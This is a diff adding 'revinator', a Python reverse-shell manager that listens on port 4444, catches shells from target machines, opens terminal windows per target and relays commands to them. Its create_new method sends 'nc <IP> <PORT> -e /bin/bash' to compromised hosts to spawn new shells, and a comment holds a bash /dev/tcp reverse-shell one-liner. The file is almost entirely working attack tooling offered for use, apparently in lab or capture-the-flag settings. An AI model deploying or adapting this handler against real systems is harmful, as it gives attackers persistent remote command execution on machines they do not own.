@@ -1,0 +1,205 @@
+#!/usr/bin/env python
+
+import argparse
+import socket
+import threading
+#from connection import connection
+import random
+import sys
+import os
+import pdb
+import time
+
+IP = "172.17.0.1"
+PORT = 4444
+
+class connection:
+    def __init__(self, conn):
+        self.conn = conn[0]
+        self.addr = conn[1][0]
+        self.port = conn[1][1]
+        self.in_file = f"{self.addr}/in"
+        self.out_file = f"{self.addr}/out"
+        self.sock = socket.socket()
+        self.connected = False
+        #print(f"connection received from {self.addr}:{self.port}")
+
+
+    def create_new(self):
+        global PORT, IP
+        self.conn.send(f"nc {IP} {PORT} -e /bin/bash & \n".encode())
+        #self.conn.send(b"/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 &\n")
+
+    def connect(self, sock):
+        self.sock = sock[0]
+        self.connected = True
+        threading.Thread(target=self.in_stream).start()
+        threading.Thread(target=self.out_stream).start()
+
+
+
+    def in_stream(self):
+        while True:
+            data = self.conn.recv(1024)
+            if data:
+                self.sock.sendall(data)
+
+
+    def out_stream(self):
+        while True:
+            data = self.sock.recv(1024)
+            if data:
+                self.conn.sendall(data)
+
+    
+
+
+def send(ip, cmd):
+    global IP, PORT
+    #os.system(f"/bin/bash -c '(printf {ip}; sleep 0.1; echo {cmd}) | nc 127.0.0.1 {PORT}'")
+    s = socket.socket()
+    s.connect(("127.0.0.1", PORT))
+    st = str(ip) + "\n"
+    s.sendall(st.encode())
+    time.sleep(0.01)
+    st = str(cmd) + "\n"
+    s.sendall(st.encode())
+    r = s.recv(1024).decode()
+    print(r)
+
+
+
+
+
+def new_window(ip):
+    wd = (f"/tmp/{ip}")
+    try:
+        os.mkdir(wd)
+    except:
+        pass
+    os.system(f"terminator -g /home/jack/revinator/config -u --working-directory {wd} 2>/dev/null")
+
+def remote(ip):
+    wd = (f"/tmp/{ip}")
+    global PORT, IP
+    os.system(f"/bin/bash -c '(printf {ip}; cat) | nc 127.0.0.1 {PORT}'")
+    quit()
+
+
+def run_t(ip):
+    wd = (f"/tmp/{ip}")
+    os.system(f"terminator -g /home/jack/revinator/config -u --working-directory {wd} 2>/dev/null")
+    quit()
+
+s = None
+
+def run(quiet_mode=False):
+    global s
+    connections = []
+    managed_connections = []
+    addresses = {}
+    unique_addresses = []
+    waitingl = []
+    waitingd = {}
+    global latest
+
+    HOST = ''
+    global PORT
+    print("serving on port " + str(PORT))
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind((HOST, PORT))
+        s.listen(1)
+        waiting = 0
+        while True:
+            connections.append(s.accept())
+
+            if connections[-1][1][0] == "127.0.0.1":    # connection from user
+                ip = connections[-1][0].recv(1024).decode().split("/")[-1].replace("\n","")
+                try:
+                    addresses[unique_addresses[int(ip)]].create_new()
+                    ip = unique_addresses[int(ip)]
+                except:
+                    try:
+                        addresses[ip].create_new()
+                    except:
+                        print("unable to attach to " + str(ip))
+                        continue
+                waitingl.append([ip, connections[-1]])
+
+            else:                                       # connection from target machine
+                managed_connections.append(connection(connections[-1]))
+                
+                latest = connections[-1][1][0]
+
+                if not latest in addresses:             # if unique address
+                    id = len(unique_addresses)
+                    d = (f"/tmp/{id}")
+                    try:
+                        os.mkdir(d)
+                    except:
+                        pass
+                    print(f"{id}:\t{latest}")
+                    addresses[latest] = managed_connections[-1]
+                    unique_addresses.append(latest)
+                    if not quiet_mode:
+                        threading.Thread(target=run_t,args=(id,)).start()
+                
+                for w in waitingl:                      # if user is waiting to connect
+                    if managed_connections[-1].addr == w[0]:
+                        managed_connections[-1].connect(w[1])
+                        waitingl.remove(w)
+
+
+if __name__ == '__main__':
+   
+    parser = argparse.ArgumentParser(prog='revinator', description='manages reverse shells and creates terminator windows', epilog='Good luck!')
+
+    # server options
+    parser.add_argument('-l', '--listen', action='store_true', help="start the server")
+    parser.add_argument('-i', '--ip', help="server option - serves on the specified IP address", default="172.17.0.1")
+    parser.add_argument('-p', '--port', help="server option - serves on the specified port", default=4444)
+
+    #client options
+    parser.add_argument('-n', '--new-window', help="creates a new terminator window to IP#", default=0)
+    parser.add_argument('-c', '--connect', help="connects to an IP# in current context", default=0)
+
+    parser.add_argument('-q', '--quiet', action='store_true', help="server option - stops the automatic creation of terminator windows")
+    parser.add_argument('-s', '--send', help="sends a command to the IP# specified by -c", default="")
+
+    args = parser.parse_args()
+
+    IP = args.ip
+    PORT = args.port
+
+    if args.listen:
+        try:
+            run()
+        except KeyboardInterrupt:
+            s.close()
+            sys.exit(1)
+
+
+    if args.quiet:
+        run(True)
+        quit()
+
+    if args.new_window:
+        new_window(args.new_window)
+        quit()
+
+    if args.send:
+        if args.connect:
+            send(args.connect, args.send)
+            quit()
+        else:
+            send(0, args.send)
+            quit()
+
+    if args.connect:
+        remote(args.connect)
+        quit()
+
+    run()
+
